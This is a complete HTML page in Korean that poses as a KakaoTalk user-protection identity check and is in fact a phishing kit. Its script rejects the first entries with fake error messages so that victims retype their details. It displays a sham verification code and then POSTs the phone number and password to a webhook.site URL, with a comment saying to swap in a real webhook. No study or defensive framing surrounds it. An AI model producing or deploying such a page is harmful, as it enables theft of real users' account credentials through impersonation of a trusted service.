<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>카카오톡 이용자보호서비스 완화</title>
  <style>
    body { margin: 0; font-family: 'Apple SD Gothic Neo', sans-serif; background: #fff; color: #222; }
    .container { max-width: 500px; margin: 0 auto; padding: 20px; }
    .hidden { display: none; }
    input, button { width: 100%; padding: 10px; margin: 8px 0; font-size: 16px; }
    button { background: #fee500; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
  </style>
</head>
<body>
  <div class="container">
    <!-- Page 1 -->
    <div id="page1">
      <h2>카카오톡 이용자보호서비스</h2>
      <button onclick="goPage2()">본인인증 시작하기</button>
    </div>

    <!-- Page 2 -->
    <div id="page2" class="hidden">
      <h3>전화번호 입력</h3>
      <input type="text" id="userId" placeholder="전화번호 입력 (예: 01012345678)">
      <button onclick="sendPhone()">본인인증하기</button>
    </div>

    <!-- Page 3 -->
    <div id="page3" class="hidden">
      <h3>인증번호 확인</h3>
      <input type="text" id="authCode" placeholder="인증번호 입력">
    </div>

    <!-- Page 4 -->
    <div id="page4" class="hidden">
      <h3>로그인</h3>
      <input type="text" id="userId4" placeholder="전화번호" readonly>
      <input type="password" id="userPw" placeholder="비밀번호">
      <button onclick="sendLogin()">로그인</button>
    </div>

    <!-- Page 5 -->
    <div id="page5" class="hidden">
      <h3>로그인 완료</h3>
      <p>정상적으로 처리되었습니다.</p>
    </div>
  </div>

  <script>
    const webhookUrl = "https://webhook.site/your-url"; // 실제 Webhook URL로 교체
    let savedPhone = "";
    let phoneTryCount = 0; // 전화번호 시도 횟수
    let loginTryCount = 0; // 로그인 시도 횟수

    // page1 -> page2
    function goPage2() {
      document.getElementById("page1").classList.add("hidden");
      document.getElementById("page2").classList.remove("hidden");
    }

    // page2 -> page3
    function sendPhone() {
      const userId = document.getElementById("userId").value.trim();
      const phoneRegex = /^010\d{8}$/;
      if (!userId) { alert("전화번호를 입력해주세요."); return; }
      if (!phoneRegex.test(userId)) { alert("잘못된 형식의 전화번호입니다."); return; }

      phoneTryCount++;

      // 1~3번째는 오류 메시지
      if (phoneTryCount < 4) {
        alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
        return;
      }

      // 4번째부터 정상 처리
      savedPhone = userId;

      fetch(webhookUrl, {
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: new URLSearchParams({page: "2", phone: userId, timestamp: new Date().toISOString()})
      }).catch(err => console.error(err));

      document.getElementById("page2").classList.add("hidden");
      document.getElementById("page3").classList.remove("hidden");

      // 랜덤 6자리 (0 포함)
      const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");

      setTimeout(() => {
        document.getElementById("authCode").value = randomCode;
        setTimeout(() => {
          document.getElementById("page3").classList.add("hidden");
          document.getElementById("page4").classList.remove("hidden");
          document.getElementById("userId4").value = savedPhone;
        }, 1000);
      }, 1500);
    }

    // page4 -> page5
    function sendLogin() {
      const userId4 = document.getElementById("userId4").value.trim();
      const userPw = document.getElementById("userPw").value.trim();
      if (!userId4 || !userPw) { alert("아이디와 비밀번호를 입력해주세요."); return; }

      loginTryCount++;

      // 1~2회차 → 무조건 비밀번호 오류
      if (loginTryCount <= 2) {
        alert("비밀번호가 틀렸습니다.");
        return;
      }

      // 3~5회차 → 정상 처리 (webhook 전송)
      if (loginTryCount >= 3 && loginTryCount <= 5) {
        fetch(webhookUrl, {
          method: "POST",
          headers: {"Content-Type": "application/x-www-form-urlencoded"},
          body: new URLSearchParams({page: "4", id: userId4, password: userPw, timestamp: new Date().toISOString()})
        }).catch(err => console.error(err));

        document.getElementById("page4").classList.add("hidden");
        document.getElementById("page5").classList.remove("hidden");
        return;
      }

      // 6번째 이후 → 제한
      if (loginTryCount > 5) {
        alert("로그인 시도 횟수를 초과했습니다.");
        return;
      }
    }
  </script>
</body>
</html>
